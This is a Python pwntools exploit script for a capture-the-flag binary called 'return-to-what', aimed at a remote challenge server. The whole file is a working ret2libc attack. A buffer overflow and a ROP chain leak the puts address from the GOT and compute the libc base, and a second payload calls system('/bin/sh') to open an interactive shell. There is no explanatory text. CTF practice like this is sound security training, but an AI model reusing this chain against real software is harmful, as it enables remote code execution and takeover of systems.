from pwn import *
context(arch='i386', os='linux')



local = False


if local:
	p = process('./return-to-what')
else:
	p = remote('chal.duc.tf',30003)



binary = ELF('./return-to-what')
rop = ROP('./return-to-what')
libc= ELF('./libc-2.27.so')

padding = "A"*56

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
main = binary.sym['main']

print(p.recv())
payload = padding + p64(pop_rdi)+ p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)
log.success("Sent payload: "+enhex(payload))
leak = p.recvline()
puts_leaked = u64(leak.strip().ljust(8,"\x00"))
log.success("puts leaked addr "+hex(puts_leaked))

libc.address = puts_leaked - libc.sym['puts']

log.info("libc base addr "+hex(libc.address))
#one_gadget=0x358dd
system = libc.sym['system']
binsh = next(libc.search('/bin/sh'))

payload2 = "A"*56 + p64(pop_rdi) + p64(binsh)+ p64(pop_rdi+1) + p64(system)

p.sendline(payload2)
log.success("Sent payload 2: "+enhex(payload2))
p.interactive()